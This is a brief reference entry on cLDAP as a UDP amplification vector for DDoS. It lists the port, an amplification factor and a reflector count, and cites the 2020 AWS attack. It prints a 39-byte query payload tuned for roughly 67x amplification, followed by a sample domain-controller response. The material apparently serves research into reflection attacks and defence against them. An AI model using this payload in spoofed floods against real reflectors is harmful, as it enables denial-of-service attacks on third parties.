# cLDAP (Connectionless Lightweight Directory Access Protocol)

## Port: 389

## Proto: UDP

## Amplification factor: 50-70x

## Reflector count: ~6,100 (Sep 2020)

---

Involved in the 2.3Tbps attack on AWS infrastructure in February 2020. <https://aws-shield-tlr.s3.amazonaws.com/2020-Q1_AWS_Shield_TLR.pdf>.

This 3 day attack contributed to the loss of 3,000 reflectors down to the current ~6,100.

### Refined payload

- From 51 to 39 bytes whilst remaining well-formed: <pre>0%\02\01\07c \04\00\n\01\00\n\01\00\02\01\00\02\01\00\01\01\00\87\0bobjectclass0\00</pre>
- Amplification factor increased to ~67x

### Example response

<pre>
0\84\00\00\0b\0e\02\01\07d\84\00\00\0b\05\04\000\84\00\00\n\fd0\84\00\00\00&\04\0bcurrentTime1\84\00\00\00\13\04\1120190922100706.0Z0\84\00\00\00R\04\11subschemaSubentry1\84\00\00\009\047CN=Aggregate,CN=Schema,CN=Configuration,DC=Mogambo,DC=D0\84\00\00\00\82\04\rdsServiceName1\84\00\00\00m\04kCN=NTDS Settings,CN=RC81230,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=Mogambo,DC=D0\84\00\00\00\bb\04\0enamingContexts1\84\00\00\00\a5\04\0fDC=Mogambo,DC=D\04 CN=Configuration,DC=Mogambo,DC=D\04*CN=Schema,CN=Configuration,DC=Mogambo,DC=D\04!DC=DomainDnsZones,DC=Mogambo,DC=D\04!DC=ForestDnsZones,DC=Mogambo,DC=D0\84\00\00\00-\04\14defaultNamingContext1\84\00\00\00\11\04\0fDC=Mogambo,DC=D0\84\00\00\00G\04\13schemaNamingContext1\84\00\00\00,\04*CN=Schema,CN=Configuration,DC=Mogambo,DC=D0\84\00\00\00D\04\1aconfigurationNamingContext1\84\00\00\00"\04 CN=Configuration,DC=Mogambo,DC=D0\84\00\00\000\04\17rootDomainNamingContext1\84\00\00\00\11\04\0fDC=Mogambo,DC=D0\84\00\00\03\a9\04\10supportedControl1\84\00\00\03\91\04\161.2.840.113556.1.4.319\04\161.2.840.113556.1.4.801\04\161.2.840.113556.1.4.473\04\161.2.840.113556.1.4.528\04\161.2.840.113556.1.4.417\04\161.2.840.113556.1.4.619\04\161.2.840.113556.1.4.841\04\161.2.840.113556.1.4.529\04\161.2.840.113556.1.4.805\04\161.2.840.113556.1.4.521\04\161.2.840.113556.1.4.970\04\171.2.840.113556.1.4.1338\04\161.2.840.113556.1.4.474\04\171.2.840.113556.1.4.1339\04\171.2.840.113556.1.4.1340\04\171.2.840.113556.1.4.1413\04\172.16.840.1.113730.3.4.9\04\182.16.840.1.113730.3.4.10\04\171.2.840.113556.1.4.1504\04\171.2.840.113556.1.4.1852\04\161.2.840.113556.1.4.802\04\171.2.840.113556.1.4.1907\04\171.2.840.113556.1.4.1948\04\171.2.840.113556.1.4.1974\04\171.2.840.113556.1.4.1341\04\171.2.840.113556.1.4.2026\04\171.2.840.113556.1.4.2064\04\171.2.840.113556.1.4.2065\04\171.2.840.113556.1.4.2066\04\171.2.840.113556.1.4.2090\04\171.2.840.113556.1.4.2205\04\171.2.840.113556.1.4.2204\04\171.2.840.113556.1.4.2206\04\171.2.840.113556.1.4.2211\04\171.2.840.113556.1.4.2239\04\171.2.840.113556.1.4.2255\04\171.2.840.113556.1.4.22560\84\00\00\00"\04\14supportedLDAPVersion1\84\00\00\00\06\04\013\04\0120\84\00\00\01\86\04\15supportedLDAPPolicies1\84\00\00\01i\04\0eMaxPoolThreads\04\19MaxPercentDirSyncRequests\04\0fMaxDatagramRecv\04\10MaxReceiveBuffer\04\0fInitRecvTimeout\04\0eMaxConnections\04\0fMaxConnIdleTime\04\0bMaxPageSize\04\16MaxBatchReturnMessages\04\10MaxQueryDuration\04\10MaxTempTableSize\04\10MaxResultSetSize\04\rMinResultSets\04\14MaxResultSetsPerConn\04\16MaxNotificationPerConn\04\0bMaxValRange\04\15MaxValRangeTransitive\04\11ThreadMemoryLimit\04\18SystemMemoryLimitPercent0\84\00\00\00%\04\13highestCommittedUSN1\84\00\00\00\n\04\08224379550\84\00\00\00I\04\17supportedSASLMechanisms1\84\00\00\00*\04\06GSSAPI\04\nGSS-SPNEGO\04\08EXTERNAL\04\nDIGEST-MD50\84\00\00\00&\04\0bdnsHostName1\84\00\00\00\13\04\11rc81230.Mogambo.D0\84\00\00\005\04\0fldapServiceName1\84\00\00\00\1e\04\1cMogambo.D:rc81230$@MOGAMBO.D0\84\00\00\00n\04\nserverName1\84\00\00\00\\\04ZCN=RC81230,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=Mogambo,DC=D0\84\00\00\00\b2\04\15supportedCapabilities1\84\00\00\00\95\04\161.2.840.113556.1.4.800\04\171.2.840.113556.1.4.1670\04\171.2.840.113556.1.4.1791\04\171.2.840.113556.1.4.1935\04\171.2.840.113556.1.4.2080\04\171.2.840.113556.1.4.22370\84\00\00\00\1c\04\0eisSynchronized1\84\00\00\00\06\04\04TRUE0\84\00\00\00"\04\14isGlobalCatalogReady1\84\00\00\00\06\04\04TRUE0\84\00\00\00\1e\04\13domainFunctionality1\84\00\00\00\03\04\0160\84\00\00\00\1e\04\13forestFunctionality1\84\00\00\00\03\04\0160\84\00\00\00(\04\1ddomainControllerFunctionality1\84\00\00\00\03\04\0160\84\00\00\00\10\02\01\07e\84\00\00\00\07\n\01\00\04\00\04\00</pre>
